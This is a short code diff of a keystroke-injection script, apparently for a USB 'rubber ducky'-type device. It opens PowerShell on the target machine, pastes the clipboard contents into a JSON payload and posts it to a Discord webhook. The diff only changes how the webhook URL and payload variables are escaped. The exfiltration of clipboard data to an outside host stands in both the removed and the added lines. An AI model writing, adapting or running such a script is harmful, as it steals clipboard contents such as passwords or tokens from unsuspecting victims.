@@ -133,13 +133,10 @@ QUACK STRING powershell
 QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 2000
-QUACK STRING $WebhookUrl = '$DISCORD_WEBHOOK'
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING $Payload = @{content = '
+QUACK STRING \$Payload = @{content = '
 QUACK CTRL v
 QUACK STRING '} | ConvertTo-Json
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'; exit;
+QUACK STRING Invoke-RestMethod -Uri \$DISCORD_WEBHOOK -Method Post -Body \$Payload -ContentType 'application/json'; exit;
 QUACK ENTER
